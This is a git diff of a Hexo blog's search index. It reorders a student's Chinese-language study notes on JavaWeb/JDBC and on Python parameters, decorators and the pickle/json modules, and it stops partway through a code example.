@@ -1,22 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>java学习历程记录-JavaWeb</title>
-    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
-    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
-<span id="more"></span>
-
-<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
-<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>JavaWeb</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Hello World</title>
     <url>/2023/11/06/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
@@ -45,6 +29,22 @@
       </categories>
       <tags>
         <tag>Spring</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>java学习历程记录-JavaWeb</title>
+    <url>/2023/11/26/java%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B%E8%AE%B0%E5%BD%95-JavaWeb/</url>
+    <content><![CDATA[<p>最近开始了java的巩固学习，想着就是对着黑马去学习，首先学习的就是javaweb这个模块，所以也就去记录一些学习的历程。</p>
+<span id="more"></span>
+
+<h1 id="一、JDBC的使用"><a href="#一、JDBC的使用" class="headerlink" title="一、JDBC的使用"></a>一、JDBC的使用</h1><h2 id="1、JDBC是什么"><a href="#1、JDBC是什么" class="headerlink" title="1、JDBC是什么"></a>1、JDBC是什么</h2><p>JDBC就是去使用Java语言操作关系型数据库的一套API，从而达到去操作不同的各种数据库。</p>
+<p>java中并没有各种数据库的实现类，只有查询语句，而实现类是各个数据库厂家提供的jar包中实现的，这样就保证了JDBC能够实现对多种数据库的兼容性。</p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>JavaWeb</tag>
       </tags>
   </entry>
   <entry>
@@ -115,78 +115,6 @@
       <tags>
         <tag>java</tag>
         <tag>serialize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python学习历程(1)</title>
-    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
-    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
-<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
-<span id="more"></span>
-
-<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>
-
-<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
-<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
-<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
-<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
-<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>
-
-<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
-
-<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>
-
-<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
-<p>&gt;&gt;&gt;</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
-
-<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
-<p><strong>取自python官方文档</strong></p>
-<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
-<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>
-
-<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
-<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span class="line">                password = <span class="built_in">input</span>(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line">                    login_flag = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;用户名或密码错误，请重新输入&#x27;</span>)</span><br><span class="line">            ret = fn(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到首页&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的订单&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@login_verify</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;欢迎来到我的资料&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index()</span><br><span class="line">order()</span><br><span class="line">profile()</span><br></pre></td></tr></table></figure>
-
-<p>之后的相应是</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PS C:\VScodeproject&gt; &amp; C:/Users/ASUS/AppData/Local/Programs/Python/Python310/python.exe c:/VScodeproject/python/python-study/装饰器应用.py</span><br><span class="line">请先登录</span><br><span class="line">还未完成用户登录操作</span><br><span class="line">请输入用户名：admin</span><br><span class="line">请输入密码：<span class="number">123456</span></span><br><span class="line">登录成功</span><br><span class="line">欢迎来到首页</span><br><span class="line">欢迎来到我的订单</span><br><span class="line">欢迎来到我的资料</span><br></pre></td></tr></table></figure>
-
-<h1 id="三、Pickle和Json模块的总结"><a href="#三、Pickle和Json模块的总结" class="headerlink" title="三、Pickle和Json模块的总结"></a>三、Pickle和Json模块的总结</h1><p>Pickle是将对象（数据）转化为字节，json是将对象（数据）转化为json格式</p>
-<blockquote>
-<p>1、dumps    把对象（数据）转化为字节</p>
-<p>2、loads       把字节转化回对象（数据）</p>
-<p>3、dump      把对象序列化成字节之后写入到文件</p>
-<p>3、load         把文件中的字节反序列化成对象 </p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
       </tags>
   </entry>
   <entry>
@@ -1185,6 +1113,239 @@
       </tags>
   </entry>
   <entry>
+    <title>python学习历程(1)</title>
+    <url>/2023/11/11/python%E5%AD%A6%E4%B9%A0%E5%8E%86%E7%A8%8B-1/</url>
+    <content><![CDATA[<p>最近也是大二了，好不容易终于接到了大创了，不过大创需要我们去深入学习python，加上打算去参加一个python的项目制作，再去想想我那python水平，简直一言难尽，只能抓紧时间赶快补了😱</p>
+<p>这里就简单记录一下一些我没有什么印象的或者感觉比较重要的知识点。</p>
+<span id="more"></span>
+
+<h1 id="一、python参数中的一些特殊参数"><a href="#一、python参数中的一些特殊参数" class="headerlink" title="一、python参数中的一些特殊参数"></a>一、python参数中的一些特殊参数</h1><p>首先就需要先去了解一下什么是位置参数和关键字参数分别是什么。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line">    <span class="built_in">print</span>(arg)</span><br><span class="line">    </span><br><span class="line">standard_arg(<span class="number">123</span>)   //位置参数，多个参数需要注意排序位置</span><br><span class="line">standard_arg(arg=<span class="number">21</span>)   //关键字参数</span><br></pre></td></tr></table></figure>
+
+<p>函数定义中未使用 <code>/</code> 和 <code>*</code> 时，参数可以按位置或关键字传递给函数。</p>
+<h2 id="1、仅位置参数"><a href="#1、仅位置参数" class="headerlink" title="1、仅位置参数"></a>1、仅位置参数</h2><p>仅限位置时，形参的顺序很重要，并且这些参数在传参时必须使用位置参数传参</p>
+<p>仅限位置形参应放在 <code>/</code> （正斜杠）前。<code>/</code> 用于在逻辑上分割仅限位置形参与其它形参。如果函数定义中没有 <code>/</code>，则表示没有仅限位置形参</p>
+<h2 id="2、仅关键词参数"><a href="#2、仅关键词参数" class="headerlink" title="2、仅关键词参数"></a>2、仅关键词参数</h2><p>把形参标记为 <em>仅限关键字</em>，表明必须以关键字参数形式传递该形参，应在参数列表中第一个 <em>仅限关键字</em> 形参前添加 <code>*</code>。</p>
+<h2 id="3、实例"><a href="#3、实例" class="headerlink" title="3、实例"></a>3、实例</h2><p>请看下面的函数定义示例，注意 <code>/</code> 和 <code>*</code> 标记：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">standard_arg</span>(<span class="params">arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">pos_only_arg</span>(<span class="params">arg, /</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">kwd_only_arg</span>(<span class="params">*, arg</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(arg)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">combined_example</span>(<span class="params">pos_only, /, standard, *, kwd_only</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(pos_only, standard, kwd_only)</span><br></pre></td></tr></table></figure>
+
+<p>第一个函数定义 <code>standard_arg</code> 是最常见的形式，对调用方式没有任何限制，可以按位置也可以按关键字传递参数：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>standard_arg(arg=<span class="number">2</span>)</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>第二个函数 <code>pos_only_arg</code> 的函数定义中有 <code>/</code>，仅限使用位置形参：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(<span class="number">1</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pos_only_arg(arg=<span class="number">1</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: pos_only_arg() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;arg&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>第三个函数 <code>kwd_only_args</code> 的函数定义通过 <code>*</code> 表明仅限关键字参数：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: kwd_only_arg() takes <span class="number">0</span> positional arguments but <span class="number">1</span> was given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>kwd_only_arg(arg=<span class="number">3</span>)</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>最后一个函数在同一个函数定义中，使用了全部三种调用惯例：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, <span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>combined_example(pos_only=<span class="number">1</span>, standard=<span class="number">2</span>, kwd_only=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: combined_example() got some positional-only arguments passed <span class="keyword">as</span> keyword arguments: <span class="string">&#x27;pos_only&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面的函数定义中，<code>kwds</code> 把 <code>name</code> 当作键，因此，可能与位置参数 <code>name</code> 产生潜在冲突：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, **kwds</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br></pre></td></tr></table></figure>
+
+<p>调用该函数不可能返回 <code>True</code>，因为关键字 <code>&#39;name&#39;</code> 总与第一个形参绑定。例如：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: foo() got multiple values <span class="keyword">for</span> argument <span class="string">&#x27;name&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>加上 <code>/</code> （仅限位置参数）后，就可以了。此时，函数定义把 <code>name</code> 当作位置参数，<code>&#39;name&#39;</code> 也可以作为关键字参数的键：</p>
+<p>&gt;&gt;&gt;</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">name, /, **kwds</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">return</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> kwds</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo(<span class="number">1</span>, **&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>换句话说，仅限位置形参的名称可以在 <code>**kwds</code> 中使用，而不产生歧义。</p>
+<p><strong>取自python官方文档</strong></p>
+<h1 id="二、装饰器"><a href="#二、装饰器" class="headerlink" title="二、装饰器"></a>二、装饰器</h1><p>可以通过修饰去简化代码并且达到相应的目的。</p>
+<h2 id="1、装饰器雏形"><a href="#1、装饰器雏形" class="headerlink" title="1、装饰器雏形"></a>1、装饰器雏形</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">guanjia</span>(<span class="params">game</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;打开外挂&quot;</span>)</span><br><span class="line">        game()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;关闭外挂&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_dnf</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊！我叫赛利亚，今天又是美好的一天！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@guanjia</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_lol</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎来到英雄联盟&quot;</span>)</span><br><span class="line"></span><br><span class="line">play_lol()</span><br></pre></td></tr></table></figure>
+
+<p>这就是一个简单的装饰器，通过这种方法就能使我们更方便的对函数进行相关的加装以及优化，</p>
+<h2 id="2、装饰器的简单应用"><a href="#2、装饰器的简单应用" class="headerlink" title="2、装饰器的简单应用"></a>2、装饰器的简单应用</h2><p>在一些程序应用当中，我们会需要利用到登入的操作，这个时候我们就会想要实现，去实现什么功能之前需要先登入，这个时候装饰器就有用武之地了。不多说，直接看个小案例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">login_flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_verify</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">global</span> login_flag</span><br><span class="line">        <span class="keyword">if</span> login_flag:</span><br><span class="line">            <span class="keyword">return</span> fn(*args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;请先登录&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还未完成用户登录操作&#x27;</span>)</span><br><span class="line">            <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">                username = <span class="built_in">input</span>(<span class="string">&#x27;请输入用户名：&#x27;</span>)</span><br><span 